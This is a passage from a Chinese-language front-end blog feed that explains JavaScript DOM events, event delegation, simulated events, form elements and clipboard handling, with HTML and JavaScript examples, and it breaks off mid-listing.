焦点事件</h4><p>焦点事件会在页面元素获得或失去焦点时触发。利用这些事件与<code>document.hasFocus()</code>及<code>document.activeElement</code>属性配合，可以知晓用户在页面上的行踪。</p><ul><li>document.hasFocus()</li><li>document.activeElement</li><li>focus: 在元素获得焦点时触发</li><li>blur: 在元素失去焦点时触发</li></ul><p><br></p><h4 id="5-3-鼠标与滚轮事件"><a href="#5-3-鼠标与滚轮事件" class="headerlink" title="5.3 鼠标与滚轮事件"></a>5.3 鼠标与滚轮事件</h4><table><thead><tr><th>鼠标事件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>click</td><td style="text-align:center">单击。只有在同一个元素上相继触发mousedown和mouseup事件，才会触发click事件</td></tr><tr><td>dbclick</td><td style="text-align:center">双击</td></tr><tr><td>mousedown</td><td style="text-align:center">用户按下任意鼠标按钮时触发</td></tr><tr><td>mouseup</td><td style="text-align:center">用户释放鼠标按钮时触发</td></tr><tr><td>mouseenter</td><td style="text-align:center">光标从元素外部首次移动到元素范围内触发</td></tr><tr><td>mouseleave</td><td style="text-align:center">在位于元素上方的光标移动到元素范围外触发</td></tr><tr><td>mousemove</td><td style="text-align:center">当光标在元素内部移动时重复触发</td></tr><tr><td>mouseover</td><td style="text-align:center">鼠标进入，同mouseover</td></tr><tr><td>mouseout</td><td style="text-align:center">鼠标移出, 同mouseout</td></tr></tbody></table><p>事件触发顺序: mousedown -&gt; mouseup -&gt; click</p><p><br></p><h4 id="5-4-键盘事件"><a href="#5-4-键盘事件" class="headerlink" title="5.4 键盘事件"></a>5.4 键盘事件</h4><table><thead><tr><th>键盘事件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>keydown</td><td style="text-align:center">当用户按下键盘上的任意键时触发，长按不放，会重复触发</td></tr><tr><td>keypress</td><td style="text-align:center">当用户按下键盘上的字符键时触发，长按不放，会重复触发</td></tr><tr><td>keyup</td><td style="text-align:center">当用户释放键盘上的键时触发</td></tr></tbody></table><p>用户按下一个字符键时候，会依次触发 keydown -&gt; keypress -&gt; keyup。</p><ul><li>event.keycCode 非字符键的键码<br>在发生keydown和keyup事件时，会有一个event.keyCode,与键盘上一个特定的键对应。</li></ul><ul><li>event.charCode 字符键的键码<br>只有在keypress的时候才触发，<code>event.charCode</code>是键的ascii码。</li></ul><ul><li><p>event.key, event.keyIdentifier, event.keyLocation<br>DOM3级事件的键盘事件，不再包含charCode属性，而包含了两个新属性: key和char。<br><code>event.key</code>对应的是相应的文本字符(如k,M)。<br><code>event.keyIdentifier</code>返回一个类似”U+0000”的字符串，表示Unicode值。(chrome和safari支持)<br><code>event.location || event.keyLocation</code>表示按下了什么位置上的键: 0-默认键盘，1-左侧位置, 2-右侧位置, 3-数字小键盘, 4-移动设备键盘(虚拟键盘), 5-手柄。(IE9,safari,chrome支持)</p></li><li><p>textInput事件<br>DOM3引入了一个新事件，只有可编辑区域才能触发textInput事件。它的<code>event.data</code>属性，就是用户输入的字符。<code>event.inputMethod</code>，表示文本输入到文本框中的方式。</p></li></ul><p><br></p><h4 id="5-5-html5事件"><a href="#5-5-html5事件" class="headerlink" title="5.5 html5事件"></a>5.5 html5事件</h4><h5 id="5-5-1-contextmenu"><a href="#5-5-1-contextmenu" class="headerlink" title="5.5.1 contextmenu"></a>5.5.1 contextmenu</h5><p>设置鼠标右击菜单<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(div, <span class="string">'contextmenu'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event = EventUtil.getEvent(event);</span><br><span class="line">    EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> menu = <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>);</span><br><span class="line">    menu.style.left = event.clientX + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.top = event.clientY + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.visibility = <span class="string">'visible'</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(<span class="built_in">document</span>, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>).style.visibility = <span class="string">'hidden'</span>;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-2-beforeunload"><a href="#5-5-2-beforeunload" class="headerlink" title="5.5.2 beforeunload"></a>5.5.2 beforeunload</h5><p>IE, firefox, safari, chrome都支持<code>beforeunload</code>事件，在浏览器卸载页面之前询问用户是否真的要关闭页面。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'beforeunload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  event.returnValue = <span class="string">"i'm really going to miss you if you go."</span>;</span><br><span class="line">  <span class="keyword">return</span> message;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-3-DOMContentLoaded"><a href="#5-5-3-DOMContentLoaded" class="headerlink" title="5.5.3 DOMContentLoaded"></a>5.5.3 DOMContentLoaded</h5><p>window的load事件会在页面中的一切都加载完毕时触发，DOMContentLoaded事件则会在形成完整的DOM树之后触发。不理会图像，js,css或其他资源是否已经下载完毕。</p><p><br></p><h5 id="5-5-4-pageshow-pagehide"><a href="#5-5-4-pageshow-pagehide" class="headerlink" title="5.5.4 pageshow, pagehide"></a>5.5.4 pageshow, pagehide</h5><p><code>window.pageshow</code>页面显示时触发。 <code>window.pagehide</code>在浏览器卸载页面时触发，在unload事情前触发。</p><p><br></p><h5 id="5-5-5-hashchange"><a href="#5-5-5-hashchange" class="headerlink" title="5.5.5 hashchange"></a>5.5.5 hashchange</h5><p>在ajax应用中，开发人员经常要利用url参数来保存状态或导航信息。url中#号后面的字符串发生变化时, hashchange事件就会被触发。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'current hash:'</span> + location.hash);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-6-设备事件"><a href="#5-6-设备事件" class="headerlink" title="5.6 设备事件"></a>5.6 设备事件</h4><h5 id="5-6-1-orientationchange"><a href="#5-6-1-orientationchange" class="headerlink" title="5.6. 1 orientationchange"></a>5.6. 1 orientationchange</h5><p>苹果safari添加了orientationchange时间，确定用户何时将设备由横向查看模式切换为纵向查看模式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHanlder(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 0 肖像模式，90 左旋转的横向模式， -90 右旋转的横向模式</span></span><br><span class="line">  div.innerHTML = <span class="string">'Current orientation is'</span> + <span class="built_in">window</span>.orientation;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-2-deviceorientation"><a href="#5-6-2-deviceorientation" class="headerlink" title="5.6.2 deviceorientation"></a>5.6.2 deviceorientation</h5><p>表示设备在空间中朝向哪里。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'deviceorientation'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// alpha, beta, gamma分别指示围绕z,x,y轴旋转时y轴，z轴，z轴的度数差</span></span><br><span class="line">  <span class="built_in">console</span>.log(event.alpha + event.beta + event.gamma);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-3-devicemotion"><a href="#5-6-3-devicemotion" class="headerlink" title="5.6.3 devicemotion"></a>5.6.3 devicemotion</h5><p>表示设备什么时候移动。事件对象包含以下属性: acceleration每个方向上的加速度; accelerationIncludingGravity在考虑z轴自然重力加速度的情况下，告诉你在每个方向上的加速度。rotationRate方向值。</p><p><br></p><h4 id="5-7-触摸与手势事件"><a href="#5-7-触摸与手势事件" class="headerlink" title="5.7 触摸与手势事件"></a>5.7 触摸与手势事件</h4><p>touchstart    : 当手指触摸屏幕时触发<br>touchmove     : 当手指在屏幕上滑动时连续第触发<br>touchend      : 当手指在屏幕上移开时触发<br>touchcancel   : 当系统停止跟踪触摸时触发</p><p>只有两个手指都触摸，才会触发这些事件<br>gesturestart  : 当一个手指已经按在屏幕上而另一个手指又触摸屏幕时触发<br>gesturechange : 当触摸屏幕的任何一个手指的位置发生变化时触发<br>gestureend    : 当任何一个手指从屏幕上面移开时触发</p><p><br></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p><em>unload</em><br><code>window.onunload</code> 在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生unload事件。这个事件最多的情况是清除引用，以避免内存泄露。</p></li><li><p><em>resize</em><br><code>window.onresize</code> 浏览器窗口被调整到一个新的高度或宽度时触发</p></li><li><p><em>scroll</em><br><code>window.scroll</code> 在文档被滚动期间重复触发</p></li><li><p><em>DOM变动事件</em><br><code>DOMNodeRemoved</code>会在使用removeChild()或replaceChild()删除结点时触发，event.target是被删除的节点，event.relatedNode包含着目标节点父节点的引用。<br><code>DOMNodeInserted</code>会在appendChild(), replaceChild(), insertBefore()插入节点时触发。</p></li></ul><p><br></p><h3 id="6-内存与性能"><a href="#6-内存与性能" class="headerlink" title="6. 内存与性能"></a>6. 内存与性能</h3><h4 id="6-1-事件委托"><a href="#6-1-事件委托" class="headerlink" title="6.1 事件委托"></a>6.1 事件委托</h4><p>对“事件处理程序过多”问题的解决方案就是<em>事件委托</em>。事件委托利用了事件冒泡，为整个页面指定一个onclick事件处理程序，而不必为每个可单击的元素分别添加事件处理程序。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(list, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> target = EventUtil.getTarget(event);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(target.id)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'doSomething'</span>:</span><br><span class="line">      doSomething();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>document对象很快就可以访问，可以在页面生命周期的任何时点上为它添加事件处理程序（无需等待DOMContentLoaded或load事件）。只要可单击的元素呈现在页面上，就可以立即具备适当的工鞥。只添加一个事件处理程序所需的DOM引用更少，占用的内存空间更少，所花的时间也更少。<br><br></p><h4 id="6-2-模拟事件"><a href="#6-2-模拟事件" class="headerlink" title="6.2 模拟事件"></a>6.2 模拟事件</h4><p><code>createEvent</code>可以创建事件，通过<code>dispatchEvent</code>触发事件。<br>UIEvent 鼠标事件和键盘事件, MouseEvents 鼠标事件, MutationEvents DOM变动事件,HTMLEvents HTML事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发按钮点击事件</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建事件对象</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(<span class="string">"MouseEvents"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化事件对象</span></span><br><span class="line">event.initMouseEvent(<span class="string">"click"</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="built_in">document</span>.defaultView, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="number">0</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line">btn.dispatchEvent(event);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《Javascript高级程序设计》第13章 事件</li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>移动端浏览器调试方法</title>
      <link href="/2019/03/29/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/"/>
      <url>/2019/03/29/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://elevenbeans.github.io/2017/06/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">移动端浏览器调试方法汇总</a></li><li><a href="https://dev.ucweb.com/docs/pwa/docs-zh/oo3g8d?spm=ucplus.11213647.toc.10.3b066fe7iUvBZy" target="_blank" rel="noopener">如何在手机上远程调试UC浏览器</a></li></ul>]]></content>
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>表单组件，formData，file对象</title>
      <link href="/2019/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2019/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h3 id="1-表单组件"><a href="#1-表单组件" class="headerlink" title="1. 表单组件"></a>1. 表单组件</h3><p><code>&lt;form&gt;</code>对应的是HTMLForm-Element类型，有它独有的属性和方法:</p><ul><li>acceptCharset: 服务器能处理的字符集</li><li>action: 接受请求的URL</li><li>elements: 表单中所有控件的集合(HTMLCollectino)</li><li>enctype: 请求的编码类型</li><li>length: 表单中控件的数量</li><li>method: 要发送的HTTP请求类型，get/post</li><li>name: 表单的名称</li><li>reset(): 将所有表单域重置为默认值</li><li>submit(): 提交表单</li><li>target: 用于发送请求和接收响应的窗口名称</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/api"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"25"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"initial value"</span> <span class="attr">autofocus</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"25"</span> <span class="attr">cols</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"color"</span> <span class="attr">value</span>=<span class="string">"red"</span> <span class="attr">readOnly</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"China"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Submit Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"reset"</span>&gt;</span>Reset Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- HTML5约束验证API --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text/email/url"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">min</span>=<span class="string">"0"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">step</span>=<span class="string">"5"</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  input.stepUp(1);</span></span><br><span class="line"><span class="comment">  input.stepDown(1);</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 点击submit button时候，会自动调用submit方法</span></span><br><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"myForm"</span>);</span><br><span class="line">EventUtil.addHandler(form, <span class="string">"submit"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 阻止表单提交，先行验证表单数据</span></span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 表单字段的共有属性</span></span><br><span class="line">  <span class="keyword">var</span> field = form.elements[<span class="number">0</span>];</span><br><span class="line">  field.value = <span class="string">"Another value"</span>;  <span class="comment">// 设置字段将被提交到服务器的值</span></span><br><span class="line">  field.disabled = <span class="literal">true</span>;          <span class="comment">// 禁用当前字段</span></span><br><span class="line">  field.type;                     <span class="comment">// 字段的类型，如checkbox, radio</span></span><br><span class="line">  field.readOnly                  <span class="comment">// 当前字段是否只读</span></span><br><span class="line">  field.focus();                  <span class="comment">// 把焦点设置到当前字段，实现自动切换焦点</span></span><br><span class="line">  field.blur();                   <span class="comment">// 失去焦点</span></span><br><span class="line">  field.select();                 <span class="comment">// 选中input, textarea的内容</span></span><br><span class="line">  form.submit();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击reset button时候，会自动调用reset方法</span></span><br><span class="line">EventUtil.addHandler(form, <span class="string">"reset"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  form.reset();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-文本框脚本"><a href="#2-文本框脚本" class="headerlink" title="2. 文本框脚本"></a>2. 文本框脚本</h3><h4 id="2-1-change事件"><a href="#2-1-change事件" class="headerlink" title="2.1 change事件"></a>2.1 change事件</h4><p>对于<code>&lt;input&gt;</code>和<code>&lt;textarea&gt;</code>，当它们获得焦点到失去焦点且value值改变时，才会触发change事件。对于<code>&lt;select&gt;</code>，只要用户选择了不同的选项，就会触发change事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">EventUtil.addHandler(textbox, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.target.value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-select事件"><a href="#2-2-select事件" class="headerlink" title="2.2 select事件"></a>2.2 select事件</h4><p>使用<code>select()</code>可以选中文本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">textbox.select();</span><br><span class="line">textbox.setSelectionRange(<span class="number">0</span>, textbox.value.length);  <span class="comment">// "hello world"</span></span><br><span class="line">textbox.setSeelctionRange(<span class="number">0</span>, <span class="number">3</span>);                     <span class="comment">// "hel"</span></span><br></pre></td></tr></table></figure></p><p>同时当你在页面中选择文本时，会触发select事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"select"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'text selected'</span> + textbox.value.substring(textbox.selectionStart, textbox.selectionEnd));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h4 id="2-3-剪贴板事件"><a href="#2-3-剪贴板事件" class="headerlink" title="2.3 剪贴板事件"></a>2.3 剪贴板事件</h4><table><thead><tr><th>剪贴板事件</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>beforecopy</td><td style="text-align:center">复制前触发</td></tr><tr><td>copy</td><td style="text-align:center">复制时触发</td></tr><tr><td>beforecut</td><td style="text-align:center">剪切前触发</td></tr><tr><td>cut</td><td style="text-align:center">剪切时触发</td></tr><tr><td>beforepaste</td><td style="text-align:center">粘贴前触发</td></tr><tr><td>paste</td><td style="text-align:center">粘贴时触发</td></tr></tbody></table><p>要访问剪贴板中的数据，可以使用<code>clipboardData</code>对象，这个对象有三个方法: getData(), setData(), clearData()<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  <span class="comment">// 获取剪贴板的文字</span></span><br><span class="line">  getClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clipboardData = (event.clipboardData || <span class="built_in">window</span>.clipboardData);</span><br><span class="line">    <span class="keyword">return</span> clipboardData.getData(<span class="string">"text"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 设置剪贴板的文字</span></span><br><span class="line">  setClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event, value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.clipboardData)&#123;</span><br><span class="line">      retrun event.clipboardData.setData(<span class="string">"text/plain"</span>, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.clipboardData)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">window</span>.clipboardData.setData(<span class="string">"text"</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置粘贴的内容</span></span><br><span class="line">EventUtil.addHanler(textbox, <span class="string">"paste"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> text = EventUtil.getClipboardText(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 确保只有数值才会被粘贴到文本框中</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d*$/</span>.test(text))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-keypress事件过滤输入"><a href="#2-4-keypress事件过滤输入" class="headerlink" title="2.4 keypress事件过滤输入"></a>2.4 keypress事件过滤输入</h4><p>响应文本框的keypress事件，阻止这个事件的默认行为来屏蔽此类字符。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"keypress"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> charCode = EventUtil.getCharCode(event);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/\d/</span>.test(<span class="built_in">String</span>.fromCharCode(charCode)))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-选择框脚本"><a href="#3-选择框脚本" class="headerlink" title="3. 选择框脚本"></a>3. 选择框脚本</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- multiple 是否多选 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>options</code>包含了所有选项。每个<code>options[i]</code>都有index, label, selected, text, value属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 